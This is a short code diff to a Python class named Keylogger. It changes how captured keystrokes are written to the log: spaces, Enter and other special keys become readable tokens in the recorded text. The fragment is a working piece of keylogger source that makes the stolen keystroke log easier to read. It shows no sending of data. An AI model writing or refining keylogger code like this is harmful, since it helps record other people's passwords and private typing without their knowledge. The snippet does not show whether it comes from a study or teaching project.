@@ -87,7 +87,12 @@ class Keylogger:
         """
         name = event.name
         if len(name) > 1:
-            pass
+            if name == "space":
+                name = " "
+            elif name == "enter":
+                name = " [ENTER]\n"
+            else:
+                name = f"[{name.upper()}]".replace(" ", "_")
         self.log += name
 
     def dispatcher(self):
